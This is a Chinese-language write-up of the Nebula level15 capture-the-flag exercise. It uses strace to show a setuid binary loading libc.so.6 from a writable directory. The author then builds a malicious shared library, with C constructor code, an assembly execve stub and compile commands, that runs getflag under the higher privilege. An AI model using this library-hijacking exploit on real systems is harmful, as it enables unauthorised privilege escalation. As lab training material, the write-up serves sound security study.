进入到/home/flag15中，可以发现目录下的flag15文件：

#+BEGIN_EXAMPLE
  -rwsr-x---  1 flag15 level15 7161 2011-11-20 21:22 flag15*
#+END_EXAMPLE

根据题目的要求，我们需要用strace命令观察flag15的系统调用情况，然后根据它调用的动态链接库来劫持它。

strace命令可跟踪一个程序的系统调用，如果strace后面只跟文件名作为参数，strace就显示出整个程序运作时的系统调用情况，以及调用的结果。执行：

#+BEGIN_EXAMPLE
  strace ./flag15
#+END_EXAMPLE

输出如下：

#+BEGIN_EXAMPLE
  execve("./flag15", ["./flag15"], [/* 19 vars */]) = 0
  brk(0)                                  = 0x9446000
  access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
  mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77d1000
  access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/tls/i686/sse2", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/tls/i686/cmov", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/tls/i686", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/tls/sse2", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/tls/cmov", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/tls", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/i686/sse2", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/i686/cmov", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/i686", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/sse2/cmov", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/sse2", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15/cmov", 0xbff5d8b4) = -1 ENOENT (No such file or directory)
  open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
  stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=4096, ...}) = 0
  open("/etc/ld.so.cache", O_RDONLY)      = 3
  fstat64(3, {st_mode=S_IFREG|0644, st_size=19474, ...}) = 0
  mmap2(NULL, 19474, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb77cc000
  close(3)                                = 0
  access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
  open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
  read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
  fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
  mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x59d000
  mmap2(0x713000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x713000
  mmap2(0x716000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x716000
  close(3)                                = 0
  mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77cb000
  set_thread_area({entry_number:-1 -> 6, base_addr:0xb77cb8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
  mprotect(0x713000, 8192, PROT_READ)     = 0
  mprotect(0x8049000, 4096, PROT_READ)    = 0
  mprotect(0x2a6000, 4096, PROT_READ)     = 0
  munmap(0xb77cc000, 19474)               = 0
  fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
  mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77d0000
  write(1, "strace it!\n", 11strace it!
  )            = 11
  exit_group(11)                          = ?
#+END_EXAMPLE

整个过程都是在调用一个叫libc.so.6的动态链接库。我随便找到这句：

#+BEGIN_EXAMPLE
  open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
#+END_EXAMPLE

提示：libc.so.6（No such file or directory）。既然没有找到libc.so.6，我们就创建一个让它找到：）

所以，我们的方法是，自己写一个有恶意指令的libc.so.6出来，当flag15调用libc.so.6时，完成劫持操作。

在这之前，需要了解下Linux动态链接库的一点预备知识,Linux里动态链接库的文件名是以“.so.版本”号结尾的，如：libc.so.6。当要调用动态链接库时，先用dlopen函数打开它。之后动态链接库的入口函数首先得到执行，在Win32编程中，DLL的入口函数是DllMain（好久没搞Windows编程了，如果没有记错的话），Linux的动态链接库的入口是_init。看到这里，希望你能有点头目了——重写_init函数。实际上_init函数是不可以拿给你“重载”的。不信你可以试一试写个_init函数覆盖它，保证会出错，_init函数是在gcc命令编译时自动加入的，主要做一些全局变量之类的初始化操作。但是，办法还是有的，通过__attribute ((constructor))，这是gcc的一个特性，可以让程序在执行_init函数之前，就先执行带有__attribute ((constructor))的函数，如：


#+BEGIN_SRC c
  __attribute ((constructor)) void init(void)
  {
    printf("hello world\n");
  }
#+END_SRC

这样，在_init执行之前，这里我们自定义的init函数就被执行了。利用这种方法，我们就用可以构造一个恶意的libc.so.6。

在/var/tmp/里mkdir一个flag15，并在这目录下touch libc.c，libc.c的代码如下：

#+BEGIN_SRC c
  #include <stdio.h>

  void __attribute__((constructor)) init()
  {
    system("/bin/getflag");
  }

#+END_SRC

然后编译：

#+BEGIN_EXAMPLE
  gcc -fpic -shared libc.c -o libc.so.6
#+END_EXAMPLE

到/home/flag15下执行./flag15，提示：

#+BEGIN_EXAMPLE
  ./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
  ./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
  ./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
  ./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference

#+END_EXAMPLE

出现symbol __cxa_finalize，说明我们还需要定义一个__cxa_finalize函数;出现：

#+BEGIN_EXAMPLE
  version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
#+END_EXAMPLE

说明glibc的版本有问题。

修改libc.c代码如下：

#+BEGIN_SRC c
  #include <stdio.h>

  void __cxa_finalize(void)
  {
    return;
  }

  void __attribute__((constructor)) init()
  {
    system("/bin/getflag");
  }
#+END_SRC

再编译一次：

#+BEGIN_EXAMPLE
  gcc -fpic -shared -nostdlib libc.c -o libc.so.6
#+END_EXAMPLE

加上-nostdlib就可以消除“version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference”提示。执行flag15，提示如下：

#+BEGIN_EXAMPLE
  ./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
  ./flag15: symbol lookup error: /var/tmp/flag15/libc.so.6: undefined symbol: system
#+END_EXAMPLE

看来不用标准库，system函数不行啊，这里我参考了下 http://uberskill.blogspot.com/2012/09/nebula-level15.html ，用汇编语言自己实现了一个system函数了。在/var/tmp/flag15下touch一个system.s，内容如下：

#+BEGIN_SRC asm
              .section .text
              .globl system
              system:

              mov $getflag, %ebx
              xor %edx, %edx  #异或清空edx，作为空参数
              push %edx
              push %ebx
              mov %esp, %ecx
              mov $11, %eax      #调用execve中断
              int $0x80

              .section .data
              getflag: .ascii "/bin/getflag\0" #注意字符串一定要空字符结尾，以及这里需要提供getflag的绝对路径
#+END_SRC

修改下libc.c的代码：

#+BEGIN_SRC c
  #include <stdio.h>

  void system(void);

  void __cxa_finalize(void)
  {
    return;
  }

  void __attribute__((constructor)) init()
  {
    system();
  }
#+END_SRC

再来编译：

#+BEGIN_EXAMPLE
  gcc -shared -fPIC -nostdlib -o libc.so.6 libc.c system.s
#+END_EXAMPLE

最后执行flag15：

#+BEGIN_EXAMPLE
  level15@nebula:/home/flag15$ ./flag15
  ./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
  You have successfully executed getflag on a target account
#+END_EXAMPLE

这时说明成功劫持了动态链接库的调用。个人认为这道题目很经典，因为它加载动态链接库时，用字符串作为参数（就是动态链接库的文件名）、且不检查对象是否正确，这个安全问题已经在Level10表现得淋漓尽致了，同样，这里也再次证实了这个问题。

参考：

1. http://uberskill.blogspot.com/2012/09/nebula-level15.html

2. http://chrismeyers.org/2012/05/01/nebula-level-15/
